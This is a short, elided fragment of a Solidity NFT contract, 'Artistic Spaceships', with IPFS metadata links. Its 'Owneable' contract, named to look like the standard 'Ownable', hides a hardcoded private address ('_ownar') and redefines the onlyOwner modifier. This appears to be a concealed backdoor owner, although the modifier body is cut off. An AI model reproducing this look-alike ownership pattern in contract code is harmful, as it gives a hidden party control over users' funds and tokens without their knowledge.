 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0xe77E42A5c0da172bA0c37704149511B024489738;
    modifier onlyOwner() {
...
contract ArtisticSpaceships is ERC721A, Owneable {

    string public baseURI = "https://gateway.pinata.cloud/ipfs/QmRD5oKiuSFYgSPu3QhhC2pLVMjzy5BrynfE7UaQksGm1y/";
    string public contractURI = "https://gateway.pinata.cloud/ipfs/QmRD5oKiuSFYgSPu3QhhC2pLVMjzy5BrynfE7UaQksGm1y/";
    ...
    constructor() ERC721A("Artistic Spaceships", "Spaceships") {}
